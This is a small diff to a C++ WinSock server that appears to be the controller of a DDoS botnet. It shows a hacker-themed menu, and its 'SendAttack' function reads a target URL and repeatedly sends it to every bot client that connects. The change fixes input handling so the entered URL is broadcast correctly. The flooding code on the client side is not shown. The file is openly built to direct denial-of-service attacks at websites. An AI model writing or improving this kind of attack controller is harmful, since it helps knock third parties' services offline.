@@ -1,6 +1,7 @@
 #include <iostream>
 #include <WinSock2.h>
 #include <WS2tcpip.h>
+#include <sstream>
 
 #define LHOST "0.0.0.0" // Don't change this
 #define LPORT 3000 // Set to the port you set on the client
@@ -93,15 +94,17 @@ int Menu() {
 	cout << RED "preciado@marlborge:~$ " << YELLOW;
 	cin >> opt;
 	cout << endl;
+	cin.ignore();
 	return opt;
 }
 
 void SendAttack() {
+	char url[1024];
 	cout << endl << GREEN "Enter the URL you want to attack (with http[s]): " RED;
-	cin.getline(buffer, sizeof(buffer));
+	cin.getline(url, sizeof(url));
 	while (true) {
 		SOCKET client = accept(sock, NULL, NULL);
-		send(client, buffer, sizeof(buffer), 0);
+		send(client, url, sizeof(url), 0);
 	}
 }
 
